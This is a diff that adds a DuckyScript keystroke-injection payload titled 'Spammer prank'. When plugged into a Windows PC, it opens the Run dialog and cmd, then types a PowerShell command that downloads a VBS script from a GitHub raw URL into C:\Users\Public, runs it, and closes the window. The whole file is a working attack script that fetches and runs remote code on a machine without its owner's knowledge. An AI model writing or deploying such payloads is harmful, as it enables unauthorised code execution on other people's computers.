@@ -1,0 +1,11 @@
+REM TITLE Spammer prank
+REM AUTHOR mrLeonTheMaster
+REM DESCRIPTION Runs the spammer prank on a windows pc, code on https://github.com/mrLeonTheMaster/prank/blob/main/spammer.vbs
+
+GUI r
+DELAY 500
+STRING cmd.exe
+ENTER
+DELAY 1500
+STRING powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/mrLeonTheMaster/prank/main/spammer.vbs -OutFile C:\Users\Public\spammer.vbs" & start C:\Users\Public\spammer.vbs & exit
+ENTER
